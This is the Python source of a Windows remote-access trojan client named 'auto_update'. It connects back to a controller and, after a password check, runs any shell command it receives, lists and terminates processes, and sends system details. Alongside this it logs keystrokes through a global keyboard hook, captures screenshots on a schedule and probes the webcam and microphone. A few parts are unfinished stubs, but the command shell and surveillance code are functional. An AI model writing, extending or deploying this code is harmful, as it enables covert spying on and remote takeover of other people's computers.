# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
import ctypes
from ctypes.wintypes import MSG
import threading
import subprocess
import sched
import datetime
import zlib

HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False
UNLOCKED = False
SECRET = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
ID = ''
secret_key = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123

destination_directory = 'iDocuments'
client_name = 'auto_update'
client_version = '1.0'
os_type = str(sys.platform)
os_name = str(platform.platform())
os_user = os.path.expanduser('~').split('\\')[-1]

KEY_LOGS = {}
SCREENSHOT_LOGS = {}
AUDIO_LOGS = {}

GLOBAL_SOCKET = None

uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

try:
    import vidcap
    cam = vidcap.new_Dev(0, 0)
    web_camera_input = str(cam.getdisplayname())
    del cam
except:
    web_camera_input = 'NoDevice'

try:
    import pyaudio
    p = pyaudio.PyAudio()
    device_name = p.get_default_input_device_info()
    del p
    audio_input = device_name['name']
except (IOError, NameError):
    audio_input = 'NoDevice'

# Init Winapi
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Shell32 = ctypes.windll.shell32
Gdi32 = ctypes.windll.gdi32
Psapi = ctypes.windll.psapi

# Init Screen Variables
hDesktopWnd = User32.GetDesktopWindow()
left = User32.GetSystemMetrics(76)
top = User32.GetSystemMetrics(77)
right = User32.GetSystemMetrics(78)
bottom = User32.GetSystemMetrics(79)
width = right - left
height = bottom - top

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]

bmp_info = BITMAPINFO()


# Init Processes Variables
EnumProcesses = Psapi.EnumProcesses
EnumProcesses.restype = ctypes.wintypes.BOOL
GetProcessImageFileName = Psapi.GetProcessImageFileNameA
GetProcessImageFileName.restype = ctypes.wintypes.DWORD
OpenProcess = Kernel32.OpenProcess
OpenProcess.restype = ctypes.wintypes.HANDLE
TerminateProcess = Kernel32.TerminateProcess
TerminateProcess.restype = ctypes.wintypes.BOOL
CloseHandle = Kernel32.CloseHandle
MAX_PATH = 260
PROCESS_TERMINATE = 0x0001
PROCESS_QUERY_INFORMATION = 0x0400


def init():
    if os.path.exists('info.nfo'):
        variables = open('info.nfo', 'r').read()
        return ast.literal_eval(variables)
    else:
        variables = {
            'i': '',
            'kts': True,
            'kt': 30,
            'ats': False,
            'at': 30,
            'sts': False,
            'std': 20,
            'st': 30,
        }
        open('info.nfo', 'w').write(str(variables))
        return variables


def screen_bits():
    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
    hdc = User32.GetDC(None)
    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    dib_rgb_colors = 0
    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
    bmp_info.bmiHeader.biSizeimage = int(
            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
    return zlib.compress(p_buf)


# TODO: Keylogger, Scheduler
def send_keylog():
    global GLOBAL_SOCKET
    global ACTIVE
    global KEY_LOGS

    config = init()
    if config['kts'] and len(KEY_LOGS) > 0:
        pass
    key_scheduler = sched.scheduler(time.time, time.sleep)
    key_scheduler.enter(config['kt'], 1, send_keylog, ())
    key_scheduler.run()


def send_screenshot():
    global GLOBAL_SOCKET
    global ACTIVE
    global SCREENSHOT_LOGS

    config = init()
    if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
        for i in SCREENSHOT_LOGS:
            data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
        SCREENSHOT_LOGS = {}
    screen_scheduler = sched.scheduler(time.time, time.sleep)
    screen_scheduler.enter(config['st'], 1, send_screenshot, ())
    screen_scheduler.run()


def send_audio():
    config = init()
    if config['ats'] and len(AUDIO_LOGS) > 0:
        print 'SENT AUDIO'
    audio_scheduler = sched.scheduler(time.time, time.sleep)
    audio_scheduler.enter(config['at'], 1, send_audio, ())
    audio_scheduler.run()


def run_scheduler():
    key_thread = threading.Thread(target=send_keylog)
    key_thread.start()
    screen_thread = threading.Thread(target=send_screenshot)
    screen_thread.start()
    audio_thread = threading.Thread(target=send_audio)
    audio_thread.start()


def get_fptr(fn):
    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    return cmpfunc(fn)


class KeyLogger:
    def __init__(self):
        self.hooked = None

    def install_hook_proc(self, pointer):
        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


class Key(threading.Thread):
    def __init__(self):
        super(Key, self).__init__()

        global KEY_LOGS

    def write_key(self, log):
        current_window_title = get_window_title()
        if KEY_LOGS.has_key(current_window_title):
            KEY_LOGS[current_window_title] += log
        else:
            KEY_LOGS[current_window_title] = log

    def hook_proc(self, n_code, w_param, l_param):

        if w_param is not 0x0100:
            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

        self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))

        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

    def start_keylogger(self):
        msg = MSG()
        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

    def run(self):
        self.keyLogger = KeyLogger()
        self.pointer = get_fptr(self.hook_proc)
        if self.keyLogger.install_hook_proc(self.pointer):
            pass
        self.start_keylogger()


# Screen Shots
class Screenshoter(threading.Thread):

    def run(self):

        while 1:
            config = init()
            if config['sts']:
                print len(screen_bits())
                delay = config['std']
                SCREENSHOT_LOGS[datetime.datetime.now()] = {
                    'screen_bits': screen_bits(),
                    'width': width,
                    'height': height,
                    'date': datetime.datetime.now(),
                }

                time.sleep(delay)
            else:
                break


# TODO: TEMP
run_scheduler()
keylogger = Key()
keylogger.start()
screenshoter = Screenshoter()
screenshoter.start()


def check_info():
    return {
        'os_type':          os_type,
        'os':               os_name,
        'protection':       str(UNLOCKED),
        'user':             os_user,
        'privileges':       str(Shell32.IsUserAnAdmin()),
        'audio_device':     audio_input,
        'webcamera_device': web_camera_input,
        'window_title':     get_window_title(),
        'key':              ID,
    }


def get_key():
    vars_dict = init()
    return vars_dict['i']


def set_key(key):
    global ID
    vars_dict = init()
    vars_dict['i'] = key
    input_file = open('info.nfo', 'w')
    input_file.write(str(vars_dict))
    input_file.close()
    ID = key
    return


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


def data_receive(sock, end='[ENDOFMESSAGE]'):
    received_data = ''
    try:
        payload = sock.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith(end):
                received_data = received_data[:-len(end)].decode('utf-8')
                break
            else:
                payload = sock.recv(1024)
                continue
        return ast.literal_eval(received_data)
    except socket.error:
        return {'payload': '', 'mode': '', 'from': '', 'to': ''}


# Send Data Function
def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
    message = {
        'payload': message,
        'mode': mode,
        'from': 'client',
        'session_id': session_id,
    }
    sock.sendall(str(message)+end)


###
# FUNCTIONS
###
# Run Shell Command
def run_shell(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return str(e)

    else:
        return "Enter a command.\n"

# Get Processes
def get_processes_list():
    PROCESSES = {}
    max_array = ctypes.c_ulong * 4096
    pProcessIds = max_array()
    pBytesReturned = ctypes.c_ulong()
    Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
    nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
    pidProcessArray = [i for i in pProcessIds][:nReturned]
    for ProcessId in pidProcessArray:
        hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
        if hProcess:
            ImageFileName = (ctypes.c_char*MAX_PATH)()
            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
                filename = os.path.basename(ImageFileName.value)
                PROCESSES[ProcessId] = filename
            CloseHandle(hProcess)
    return str(PROCESSES)


# Terminate Process
def terminateProcess(PID):
    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
    TerminateProcess(hProcess, 1)


def send_info(sock):
    global ACTIVE

    while ACTIVE:
        try:
            data_send(sock, check_info(), 'infoChecker')
            time.sleep(5)
        except socket.error:
            ACTIVE = False

def reactor():
    global ACTIVE
    global UNLOCKED
    global ID
    global GLOBAL_SOCKET

    while 1:
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((HOST, PORT))
            ACTIVE = True
        except:
            time.sleep(5)
            continue

        GLOBAL_SOCKET = server_socket

        while ACTIVE:
            try:

                # Begin Init
                data = data_receive(server_socket)
                if data['payload'] == 'connectSuccess':
                    key = get_key()
                    if len(key) != 0:
                        ID = key
                        data_send(server_socket, key, 'clientInitializing')
                    else:
                        data_send(server_socket, 'noKey', 'clientInitializing')
                        new_key = data_receive(server_socket)
                        set_key(new_key['payload'])
                        ID = new_key['payload']

                    info_sernder_thread = threading.Thread(target=send_info, args=(server_socket,))
                    info_sernder_thread.start()

                    # After Initialized
                    while ACTIVE:
                        try:
                            data = data_receive(server_socket)
                        except socket.error:
                            break

                        if data['payload'].startswith('unlockClient '):
                            pass_key = data['payload'].split()[-1]
                            if pass_key == SECRET:
                                UNLOCKED = True

                                data_send(server_socket, 'loginSuccess', 'loginSuccess', session_id=data['session_id'])

                                while UNLOCKED:

                                    try:
                                        data = data_receive(server_socket)

                                        # Lock Client
                                        if data['payload'] == 'lockClient':
                                            UNLOCKED = False
                                            continue

                                        # Choose dir
                                        elif data['payload'].startswith('cd '):
                                            try:
                                                os.chdir(data['payload'][3:])
                                                output = ''
                                            except:
                                                output = 'dirOpenError'

                                        # Get Processes List
                                        elif data['payload'] == 'getProcessesList':
                                            output = get_processes_list()

                                        # Terminate Process
                                        elif data['payload'].startswith('terminateProcess '):
                                            pid = data['payload'].split()[-1]
                                            terminateProcess(int(pid))
                                            continue

                                        # Run Shell
                                        else:
                                            output = run_shell(data['payload'])
                                        data_send(server_socket, output, 'shellMode', session_id=data['session_id'])

                                    except socket.error:
                                        break

                            else:
                                data_send(server_socket, 'notAuthorized', 'notAuthorized')


                        else:
                            data_send(server_socket, 'notAuthorized', 'notAuthorized')
                            continue

                else:
                    pass

            except socket.error:
                server_socket.close()
                time.sleep(10)
                break

reactor()
